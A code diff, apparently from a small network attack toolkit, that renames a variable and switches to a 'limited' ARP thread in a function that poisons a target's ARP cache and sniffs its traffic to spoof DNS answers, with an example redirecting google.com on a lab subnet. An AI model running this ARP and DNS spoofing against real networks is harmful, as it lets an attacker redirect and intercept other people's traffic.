@@ -70,13 +70,13 @@ def dns_pkt_check(pkt):
 # Start the DNS poisoning process
 def start_dns_spoofing(cmd):
     args = shlex.split(cmd)
-    tgtip = dom = None
+    target_ip = dom = None
     for i, arg in enumerate(args):
         if arg == "-iface" and i + 1 < len(args):
             global iface
             iface = args[i + 1]
         elif arg == "-tgtip" and i + 1 < len(args):
-            tgtip = args[i + 1]
+            target_ip = args[i + 1]
         elif arg == "-dom" and i + 1 < len(args):
             dom = args[i + 1]
             global spoofed_dom
@@ -85,7 +85,7 @@ def start_dns_spoofing(cmd):
             global spoofed_addr
             spoofed_addr = args[i + 1]
 
-    if not iface or not tgtip or not dom or not spoofed_addr:
+    if not iface or not target_ip or not dom or not spoofed_addr:
         print("[!] Usage: dnspoison -iface <iface> -tgtip <target_ip> -dom <domain> -spaddr <spoofed_address>")
         return
 
@@ -96,10 +96,10 @@ def start_dns_spoofing(cmd):
 
     get_gateway()
 
-    start_arp_thread(dns_server_ip, tgtip, 10)
-    start_arp_thread(tgtip, dns_server_ip, 10)
+    start_limited_arp_thread(dns_server_ip, target_ip, 10)
+    start_limited_arp_thread(target_ip, dns_server_ip, 10)
 
-    sniff(store = 0, filter="src host " + str(tgtip), iface = iface, prn = lambda x: dns_pkt_check(x))
+    sniff(store = 0, filter="src host " + str(target_ip), iface = iface, prn = lambda x: dns_pkt_check(x))
 
 # Example usage:
 # dnsspoof -iface enp0s9 -tgtip 10.0.2.4 -dom google.com -spaddr 10.0.2.5 
